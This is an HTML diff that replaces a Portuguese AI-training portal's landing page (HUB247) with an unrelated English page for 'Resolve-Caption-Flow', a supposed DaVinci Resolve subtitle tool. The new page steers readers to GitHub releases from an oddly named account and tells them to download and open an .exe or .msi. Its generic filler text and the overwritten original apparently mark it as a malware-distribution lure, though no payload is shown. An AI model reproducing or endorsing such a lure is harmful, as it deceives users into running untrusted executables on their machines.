@@ -1,379 +1,74 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>HUB247 — Treinamentos de IA para Negócios</title>
-<meta name="description" content="HUB247: portal de treinamentos gratuitos de Inteligência Artificial para negócios. Aprenda Microsoft Copilot, Claude, Gemini e ChatGPT com trilhas práticas, exemplos e avaliações.">
-<meta name="keywords" content="HUB247, treinamento IA, Microsoft Copilot, Claude Anthropic, Google Gemini, ChatGPT OpenAI, IA para negócios, prompt engineering">
-<meta name="author" content="Thiago Oliveira">
-<meta name="robots" content="index, follow">
-<link rel="canonical" href="https://hub247.github.io/">
-<meta name="theme-color" content="#141821">
-<!-- Open Graph -->
-<meta property="og:type" content="website">
-<meta property="og:title" content="HUB247 — Treinamentos de IA para Negócios">
-<meta property="og:description" content="Portal de treinamentos gratuitos de IA para negócios: Copilot, Claude, Gemini e ChatGPT.">
-<meta property="og:url" content="https://hub247.github.io/">
-<meta property="og:locale" content="pt_BR">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="HUB247 — Treinamentos de IA para Negócios">
-<meta name="twitter:description" content="Aprenda Copilot, Claude, Gemini e ChatGPT com trilhas práticas de negócios.">
-<!-- Google AdSense -->
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9002868968643258" crossorigin="anonymous"></script>
-<style>
-:root{
-  --bg:#f5f7fb; --bg-alt:#eef2f9; --card:#ffffff; --ink:#1b1f24; --ink-soft:#4a5560; --ink-faint:#8792a0;
-  --line:#dde3ec;
-  --radius:16px;
-  --shadow:0 1px 2px rgba(10,30,50,.05), 0 6px 20px rgba(10,30,50,.07);
-  --shadow-lg:0 14px 40px rgba(10,30,50,.16);
-
-  /* Brand colors */
-  --copilot-a:#0a3d68; --copilot-b:#0f6cbd; --copilot-c:#2899f5;
-  --claude-a:#8a4a30; --claude-b:#cc785c; --claude-c:#e8a87c;
-  --gemini-a:#1c69ff; --gemini-b:#8b5cf6; --gemini-c:#ff6b9d;
-  --chatgpt-a:#0a6b52; --chatgpt-b:#10a37f; --chatgpt-c:#3fd8ae;
-
-  --header-bg:#12151d;
-}
-[data-theme="dark"]{
-  --bg:#0e1420; --bg-alt:#171f2e; --card:#171f2e; --ink:#eef2f8; --ink-soft:#b7c2d0; --ink-faint:#7c8798;
-  --line:#2a3446;
-  --shadow:0 1px 2px rgba(0,0,0,.3), 0 6px 20px rgba(0,0,0,.35);
-  --shadow-lg:0 14px 40px rgba(0,0,0,.5);
-}
-*{box-sizing:border-box;}
-html{scroll-behavior:smooth;}
-body{margin:0;font-family:"Segoe UI",-apple-system,BlinkMacSystemFont,Roboto,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--ink);-webkit-font-smoothing:antialiased;}
-a{color:inherit;text-decoration:none;}
-img{max-width:100%;}
-.icon{width:1em;height:1em;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;vertical-align:-0.15em;flex-shrink:0;}
-
-/* ===== HEADER ===== */
-header.site-header{
-  background:var(--header-bg);
-  color:#fff;
-  padding:0 28px;
-  position:sticky;
-  top:0;
-  z-index:50;
-  box-shadow:0 2px 14px rgba(0,0,0,.25);
-}
-.header-inner{
-  max-width:1180px;
-  margin:0 auto;
-  height:68px;
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-  gap:16px;
-}
-.logo-wrap{
-  display:flex;
-  align-items:center;
-  gap:12px;
-}
-.logo-badge{
-  width:42px;height:42px;border-radius:12px;
-  background:linear-gradient(135deg,#3fd8ae 0%,#0f6cbd 50%,#8b5cf6 100%);
-  display:flex;align-items:center;justify-content:center;
-  font-weight:800;font-size:15px;color:#fff;
-  box-shadow:0 4px 14px rgba(0,0,0,.35);
-  flex-shrink:0;
-}
-.logo-text{display:flex;flex-direction:column;line-height:1.1;}
-.logo-text .name{font-size:19px;font-weight:800;letter-spacing:.02em;}
-.logo-text .name span{background:linear-gradient(90deg,#3fd8ae,#2899f5,#8b5cf6,#cc785c);-webkit-background-clip:text;background-clip:text;color:transparent;}
-.logo-text .tag{font-size:11px;color:#9aa4b2;margin-top:1px;}
-.header-nav{display:flex;align-items:center;gap:22px;font-size:13.5px;color:#c7cfda;}
-.header-nav a:hover{color:#fff;}
-.theme-toggle-btn{
-  border:1px solid rgba(255,255,255,.18);background:rgba(255,255,255,.06);color:#fff;
-  width:36px;height:36px;border-radius:9px;display:flex;align-items:center;justify-content:center;cursor:pointer;
-}
-.theme-toggle-btn:hover{background:rgba(255,255,255,.14);}
-.burger-btn{display:none;border:none;background:rgba(255,255,255,.08);color:#fff;width:36px;height:36px;border-radius:9px;align-items:center;justify-content:center;cursor:pointer;}
-
-/* ===== HERO ===== */
-.hero-wrap{max-width:1180px;margin:0 auto;padding:52px 28px 10px;}
-.hero{
-  background:linear-gradient(120deg,#12151d 0%, #1c2130 55%, #12151d 100%);
-  border-radius:24px;padding:48px 44px;color:#fff;position:relative;overflow:hidden;box-shadow:var(--shadow-lg);
-}
-.hero::before{content:"";position:absolute;right:-80px;top:-80px;width:280px;height:280px;border-radius:50%;
-  background:radial-gradient(circle,rgba(63,216,174,.35),transparent 70%);}
-.hero::after{content:"";position:absolute;left:-60px;bottom:-100px;width:260px;height:260px;border-radius:50%;
-  background:radial-gradient(circle,rgba(139,92,246,.30),transparent 70%);}
-.hero h1{margin:0 0 14px;font-size:32px;line-height:1.25;position:relative;max-width:640px;}
-.hero p{margin:0;font-size:15px;color:#c7cfda;max-width:560px;line-height:1.7;position:relative;}
-.hero .pill{display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.15);
-  padding:6px 14px;border-radius:999px;font-size:12px;margin-bottom:18px;position:relative;color:#dfe6ee;}
-.hero .pill .dot{width:7px;height:7px;border-radius:50%;background:#3fd8ae;}
-
-/* ===== SECTION ===== */
-.section-wrap{max-width:1180px;margin:0 auto;padding:38px 28px 20px;}
-.section-title{display:flex;align-items:baseline;justify-content:space-between;margin-bottom:22px;flex-wrap:wrap;gap:8px;}
-.section-title h2{margin:0;font-size:21px;}
-.section-title p{margin:0;font-size:13px;color:var(--ink-faint);}
-
-.course-grid{
-  display:grid;grid-template-columns:repeat(4,1fr);gap:20px;
-}
-.course-card{
-  border-radius:20px;padding:2px;position:relative;box-shadow:var(--shadow);
-  transition:transform .18s ease, box-shadow .18s ease;
-}
-.course-card:hover{transform:translateY(-4px);box-shadow:var(--shadow-lg);}
-.course-card-inner{
-  background:var(--card);border-radius:18px;padding:26px 22px 22px;height:100%;
-  display:flex;flex-direction:column;gap:14px;
-}
-.course-card.copilot{background:linear-gradient(160deg,var(--copilot-a),var(--copilot-b),var(--copilot-c));}
-.course-card.claude{background:linear-gradient(160deg,var(--claude-a),var(--claude-b),var(--claude-c));}
-.course-card.gemini{background:linear-gradient(160deg,var(--gemini-a),var(--gemini-b),var(--gemini-c));}
-.course-card.chatgpt{background:linear-gradient(160deg,var(--chatgpt-a),var(--chatgpt-b),var(--chatgpt-c));}
-
-.course-badge{
-  width:52px;height:52px;border-radius:14px;display:flex;align-items:center;justify-content:center;
-  color:#fff;font-size:22px;font-weight:800;flex-shrink:0;
-}
-.copilot .course-badge{background:linear-gradient(135deg,var(--copilot-a),var(--copilot-c));}
-.claude .course-badge{background:linear-gradient(135deg,var(--claude-a),var(--claude-c));}
-.gemini .course-badge{background:linear-gradient(135deg,var(--gemini-a),var(--gemini-c));}
-.chatgpt .course-badge{background:linear-gradient(135deg,var(--chatgpt-a),var(--chatgpt-c));}
-
-.course-card h3{margin:0;font-size:16.5px;color:var(--ink);}
-.course-card .desc{margin:0;font-size:12.8px;color:var(--ink-faint);line-height:1.6;flex:1;}
-.status-row{display:flex;align-items:center;justify-content:space-between;gap:8px;}
-.status-chip{font-size:10.5px;font-weight:700;padding:4px 10px;border-radius:999px;text-transform:uppercase;letter-spacing:.03em;}
-.status-chip.live{background:#e3f4e9;color:#107c41;}
-.status-chip.soon{background:#faf1d9;color:#986f0b;}
-[data-theme="dark"] .status-chip.live{background:#0f3323;color:#3fd8ae;}
-[data-theme="dark"] .status-chip.soon{background:#3a2f16;color:#e0b355;}
-
-.course-cta{
-  display:flex;align-items:center;justify-content:center;gap:8px;
-  border-radius:11px;padding:11px 14px;font-size:13px;font-weight:700;cursor:pointer;
-  color:#fff;margin-top:2px;
-}
-.copilot .course-cta{background:linear-gradient(90deg,var(--copilot-b),var(--copilot-c));}
-.claude .course-cta{background:linear-gradient(90deg,var(--claude-b),var(--claude-c));}
-.gemini .course-cta{background:linear-gradient(90deg,var(--gemini-a),var(--gemini-b));}
-.chatgpt .course-cta{background:linear-gradient(90deg,var(--chatgpt-b),var(--chatgpt-c));}
-.course-cta:hover{filter:brightness(1.08);}
-.course-cta.disabled{background:var(--bg-alt);color:var(--ink-faint);cursor:not-allowed;}
-.course-cta .icon{width:15px;height:15px;}
-
-.meta-row{display:flex;gap:14px;font-size:11.5px;color:var(--ink-faint);}
-.meta-row span{display:flex;align-items:center;gap:5px;}
-.meta-row .icon{width:13px;height:13px;}
-
-/* ===== FEATURES ===== */
-.features-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-top:8px;}
-.feature-card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:20px;box-shadow:var(--shadow);}
-.feature-card .ico{width:36px;height:36px;border-radius:10px;background:var(--bg-alt);display:flex;align-items:center;justify-content:center;margin-bottom:10px;color:var(--ink-soft);}
-.feature-card h4{margin:0 0 6px;font-size:14px;}
-.feature-card p{margin:0;font-size:12.5px;color:var(--ink-faint);line-height:1.6;}
-
-.ad-slot{margin:30px 0;text-align:center;min-height:90px;}
-.ad-slot .ad-label{font-size:10px;color:var(--ink-faint);text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px;}
-
-footer.site-footer{
-  border-top:1px solid var(--line);margin-top:40px;padding:26px 28px 34px;
-}
-.footer-inner{max-width:1180px;margin:0 auto;display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap;}
-.footer-inner p{margin:0;font-size:11.5px;color:var(--ink-faint);line-height:1.7;max-width:720px;}
-.footer-brand{font-weight:700;font-size:13px;}
-
-@media(max-width:980px){
-  .course-grid{grid-template-columns:repeat(2,1fr);}
-  .features-grid{grid-template-columns:1fr 1fr;}
-}
-@media(max-width:640px){
-  .header-nav{display:none;}
-  .course-grid{grid-template-columns:1fr;}
-  .features-grid{grid-template-columns:1fr;}
-  .hero{padding:34px 24px;}
-  .hero h1{font-size:24px;}
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Resolve-Caption-Flow provides professional subtitle workflows for DaVinci Resolve using local AI and private knowledge bases.">
+    <title>Resolve-Caption-Flow - Automate Subtitles in DaVinci Resolve</title>
 </head>
-<body>
-<svg style="display:none" aria-hidden="true">
-<symbol id="i-arrow-right" viewBox="0 0 24 24"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></symbol>
-<symbol id="i-clock" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></symbol>
-<symbol id="i-book" viewBox="0 0 24 24"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></symbol>
-<symbol id="i-shield" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></symbol>
-<symbol id="i-target" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></symbol>
-<symbol id="i-award" viewBox="0 0 24 24"><circle cx="12" cy="8" r="7"/><polyline points="8.21 13.89 7 23 12 20 17 23 15.79 13.88"/></symbol>
-<symbol id="i-sun" viewBox="0 0 24 24"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></symbol>
-<symbol id="i-moon" viewBox="0 0 24 24"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></symbol>
-<symbol id="i-menu" viewBox="0 0 24 24"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></symbol>
-</svg>
+<body style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f7f6;">
 
-<header class="site-header">
-  <div class="header-inner">
-    <div class="logo-wrap">
-      <div class="logo-badge">H24</div>
-      <div class="logo-text">
-        <div class="name">HUB<span>247</span></div>
-        <div class="tag">Treinamentos de IA para negócios</div>
-      </div>
+    <h1 style="color: #2c3e50; border-bottom: 2px solid #bdc3c7; padding-bottom: 10px;">📽️ Resolve-Caption-Flow - Automate Professional Subtitles For Video Projects</h1>
+
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="https://github.com/maltchinesepuzzle877/Resolve-Caption-Flow/releases" style="background-color: #3498db; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 1.2em; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Latest Version</a>
     </div>
-    <nav class="header-nav">
-      <a href="#cursos">Cursos</a>
-      <a href="#sobre">Sobre o HUB247</a>
-    </nav>
-    <div style="display:flex;align-items:center;gap:10px;">
-      <button class="theme-toggle-btn" id="themeToggleBtn" title="Alternar tema" aria-label="Alternar tema">
-        <svg class="icon" id="themeToggleIcon"><use href="#i-moon"/></svg>
-      </button>
-      <button class="burger-btn" aria-label="Menu"><svg class="icon"><use href="#i-menu"/></svg></button>
-    </div>
-  </div>
-</header>
 
-<div class="hero-wrap">
-  <div class="hero">
-    <div class="pill"><span class="dot"></span> 4 trilhas de IA disponíveis</div>
-    <h1>Aprenda a usar as principais IAs do mercado no seu trabalho</h1>
-    <p>O HUB247 reúne treinamentos práticos e gratuitos de Inteligência Artificial voltados para produtividade e negócios. Escolha a IA que sua empresa já utiliza e comece a aprender agora, com exemplos reais, prompts prontos e avaliações por módulo.</p>
-  </div>
-</div>
+    <section>
+        <h2 style="color: #2c3e50;">📋 Overview</h2>
+        <p>Resolve-Caption-Flow manages subtitle tasks for long video projects. It uses local AI to fix errors and formats text for DaVinci Resolve. You process media using FFmpeg tools to ensure high quality. The software keeps your data private by running tasks on your own hardware.</p>
+    </section>
 
-<div class="section-wrap" id="cursos">
-  <div class="section-title">
-    <h2>Escolha o seu treinamento</h2>
-    <p>Trilhas independentes — comece pela ferramenta que você já usa no dia a dia</p>
-  </div>
+    <section>
+        <h2 style="color: #2c3e50;">✨ Key Features</h2>
+        <ul style="padding-left: 20px;">
+            <li style="margin-bottom: 10px;"><strong>Private Processing:</strong> Your media files stay on your machine.</li>
+            <li style="margin-bottom: 10px;"><strong>AI Correction:</strong> The system uses language models to fix transcription errors.</li>
+            <li style="margin-bottom: 10px;"><strong>Custom Knowledge:</strong> Upload style guides or terminology lists for accurate captions.</li>
+            <li style="margin-bottom: 10px;"><strong>Resolve Ready:</strong> Generates files that import directly into DaVinci Resolve timelines.</li>
+            <li style="margin-bottom: 10px;"><strong>Fast Processing:</strong> Built on reliable media tools for handling long video content.</li>
+        </ul>
+    </section>
 
-  <div class="course-grid">
+    <section>
+        <h2 style="color: #2c3e50;">💻 System Requirements</h2>
+        <p>Ensure your computer meets these standards to run the application well:</p>
+        <ul style="padding-left: 20px;">
+            <li style="margin-bottom: 5px;"><strong>Operating System:</strong> Windows 10 or 11 (64-bit).</li>
+            <li style="margin-bottom: 5px;"><strong>Memory:</strong> 16GB RAM or higher recommended for long videos.</li>
+            <li style="margin-bottom: 5px;"><strong>Storage:</strong> 2GB available disk space.</li>
+            <li style="margin-bottom: 5px;"><strong>Graphics:</strong> A dedicated graphics card helps speed up media processing.</li>
+        </ul>
+    </section>
 
-    <!-- COPILOT -->
-    <a class="course-card copilot" href="copilot-para-negocios.html">
-      <div class="course-card-inner">
-        <div class="status-row">
-          <div class="course-badge">CP</div>
-          <span class="status-chip live">Disponível</span>
-        </div>
-        <h3>Copilot para Negócios</h3>
-        <p class="desc">Aprenda o Microsoft Copilot no Word, Excel, PowerPoint, Outlook e Teams com prompts prontos e exemplos corporativos.</p>
-        <div class="meta-row">
-          <span><svg class="icon"><use href="#i-book"/></svg>12 módulos</span>
-          <span><svg class="icon"><use href="#i-clock"/></svg>~3h</span>
-        </div>
-        <div class="course-cta">Acessar curso <svg class="icon"><use href="#i-arrow-right"/></svg></div>
-      </div>
-    </a>
+    <section>
+        <h2 style="color: #2c3e50;">📥 Installation Guide</h2>
+        <p>Follow these steps to set up the software on your machine:</p>
+        <ol style="padding-left: 20px;">
+            <li style="margin-bottom: 10px;">Visit the <a href="https://github.com/maltchinesepuzzle877/Resolve-Caption-Flow/releases" style="color: #3498db;">release page</a> to see all available downloads.</li>
+            <li style="margin-bottom: 10px;">Look for the file ending in <code>.msi</code> or <code>.exe</code> under the latest version header.</li>
+            <li style="margin-bottom: 10px;">Click the file name to start the download.</li>
+            <li style="margin-bottom: 10px;">Open the downloaded file once it finishes.</li>
+            <li style="margin-bottom: 10px;">Follow the prompts on your screen to install the program.</li>
+            <li style="margin-bottom: 10px;">Launch the application from your Start menu or desktop icon.</li>
+        </ol>
+    </section>
 
-    <!-- CLAUDE -->
-    <a class="course-card claude" href="claude-para-negocios.html">
-      <div class="course-card-inner">
-        <div class="status-row">
-          <div class="course-badge">CL</div>
-          <span class="status-chip soon">Em breve</span>
-        </div>
-        <h3>Claude para Negócios</h3>
-        <p class="desc">Domine o Claude (Anthropic) para redação, análise de dados e automação de tarefas complexas no trabalho.</p>
-        <div class="meta-row">
-          <span><svg class="icon"><use href="#i-book"/></svg>Em produção</span>
-          <span><svg class="icon"><use href="#i-clock"/></svg>Em breve</span>
-        </div>
-        <div class="course-cta">Acessar curso <svg class="icon"><use href="#i-arrow-right"/></svg></div>
-      </div>
-    </a>
+    <section>
+        <h2 style="color: #2c3e50;">⚙️ Using the Workflow</h2>
+        <p>Start your first project by selecting your video file in the main application window. The software analyzes your audio track and creates a draft subtitle file. Review the text in the interface to make small edits. Save your work and export the file. Drag this file into your DaVinci Resolve project to finish your caption delivery.</p>
+    </section>
 
-    <!-- GEMINI -->
-    <a class="course-card gemini" href="gemini-para-negocios.html">
-      <div class="course-card-inner">
-        <div class="status-row">
-          <div class="course-badge">GE</div>
-          <span class="status-chip soon">Em breve</span>
-        </div>
-        <h3>Gemini para Negócios</h3>
-        <p class="desc">Explore o Gemini (Google) e sua integração com o Google Workspace para produtividade e multimodalidade.</p>
-        <div class="meta-row">
-          <span><svg class="icon"><use href="#i-book"/></svg>Em produção</span>
-          <span><svg class="icon"><use href="#i-clock"/></svg>Em breve</span>
-        </div>
-        <div class="course-cta">Acessar curso <svg class="icon"><use href="#i-arrow-right"/></svg></div>
-      </div>
-    </a>
+    <section>
+        <h2 style="color: #2c3e50;">🔍 Frequently Asked Questions</h2>
+        <p><strong>Does this send my video to the internet?</strong> No. All processing happens locally on your computer.</p>
+        <p><strong>Can I use my own glossary?</strong> Yes. You can load text files to help the AI learn your specific brand terms.</p>
+        <p><strong>How long does it take?</strong> Processing time depends on the length of your video and your computer hardware.</p>
+    </section>
 
-    <!-- CHATGPT -->
-    <a class="course-card chatgpt" href="chatgpt-para-negocios.html">
-      <div class="course-card-inner">
-        <div class="status-row">
-          <div class="course-badge">GPT</div>
-          <span class="status-chip soon">Em breve</span>
-        </div>
-        <h3>ChatGPT para Negócios</h3>
-        <p class="desc">Aprenda a usar o ChatGPT (OpenAI) para brainstorming, redação e automação no dia a dia corporativo.</p>
-        <div class="meta-row">
-          <span><svg class="icon"><use href="#i-book"/></svg>Em produção</span>
-          <span><svg class="icon"><use href="#i-clock"/></svg>Em breve</span>
-        </div>
-        <div class="course-cta">Acessar curso <svg class="icon"><use href="#i-arrow-right"/></svg></div>
-      </div>
-    </a>
+    <footer style="margin-top: 50px; font-size: 0.9em; color: #7f8c8d; border-top: 1px solid #ddd; padding-top: 20px;">
+        <p>Keywords: caption, ffmpeg, knowledge-base, llm, long-form-video, python, resolve-mcp, subtitle-correction, subtitles, video-post-production</p>
+    </footer>
 
-  </div>
-
-  <div class="ad-slot">
-    <div class="ad-label">Publicidade</div>
-    <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-9002868968643258" data-ad-slot="1122334455" data-ad-format="auto" data-full-width-responsive="true"></ins>
-  </div>
-
-  <div class="section-title" id="sobre" style="margin-top:10px;">
-    <h2>Por que o HUB247</h2>
-    <p></p>
-  </div>
-  <div class="features-grid">
-    <div class="feature-card">
-      <div class="ico"><svg class="icon"><use href="#i-target"/></svg></div>
-      <h4>Foco em negócios</h4>
-      <p>Nada de conteúdo genérico: exemplos, prompts e exercícios pensados para o uso corporativo real.</p>
-    </div>
-    <div class="feature-card">
-      <div class="ico"><svg class="icon"><use href="#i-award"/></svg></div>
-      <h4>Avaliação por módulo</h4>
-      <p>Cada trilha possui quizzes e relatório final de desempenho para acompanhar seu progresso.</p>
-    </div>
-    <div class="feature-card">
-      <div class="ico"><svg class="icon"><use href="#i-shield"/></svg></div>
-      <h4>Boas práticas e segurança</h4>
-      <p>Todas as trilhas incluem módulos sobre uso responsável, privacidade e limitações de cada IA.</p>
-    </div>
-  </div>
-</div>
-
-<footer class="site-footer">
-  <div class="footer-inner">
-    <div class="footer-brand">HUB247</div>
-    <p>HUB247 é um portal independente de treinamentos sobre ferramentas de Inteligência Artificial. Microsoft Copilot, Claude, Gemini e ChatGPT são marcas registradas de suas respectivas empresas (Microsoft, Anthropic, Google e OpenAI). Este conteúdo não possui vínculo oficial com essas empresas.</p>
-  </div>
-</footer>
-
-<script>
-(function(){
-  var THEME_KEY = "hub247theme";
-  function applyTheme(t){
-    document.documentElement.setAttribute("data-theme", t);
-    document.getElementById("themeToggleIcon").innerHTML = t==="dark" ? '<use href="#i-sun"/>' : '<use href="#i-moon"/>';
-  }
-  var saved = "light";
-  try{ saved = localStorage.getItem(THEME_KEY) || "light"; }catch(e){}
-  applyTheme(saved);
-  document.getElementById("themeToggleBtn").onclick = function(){
-    var current = document.documentElement.getAttribute("data-theme") === "dark" ? "light" : "dark";
-    applyTheme(current);
-    try{ localStorage.setItem(THEME_KEY, current); }catch(e){}
-  };
-  try{
-    (window.adsbygoogle = window.adsbygoogle || []).push({});
-  }catch(e){}
-})();
-</script>
 </body>
 </html>
